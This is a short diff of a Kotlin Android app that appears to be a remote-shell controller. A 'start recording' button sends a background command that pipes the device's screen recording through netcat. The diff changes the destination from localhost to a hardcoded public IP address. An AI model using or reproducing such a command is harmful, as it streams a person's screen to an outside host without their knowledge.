@@ -156,7 +156,7 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
                             } else if (!isSettings && !uiState.screenViewerVisible) {
                                 if (!uiState.fileManagerVisible && uiState.selectedTarget is ShellTarget.Client) {
                                 IconButton(onClick = { 
-                vm.sendCommand("nohup screenrecord --bit-rate 100000 --output-format=h264 - | nc 127.0.0.1 40001 > /dev/null 2>&1 &")
+                vm.sendCommand("nohup screenrecord --bit-rate 100000 --output-format=h264 - | nc 47.113.126.123 40001 > /dev/null 2>&1 &")
             }) {
                 Icon(Icons.Default.Videocam, contentDescription = "start recording")
             }
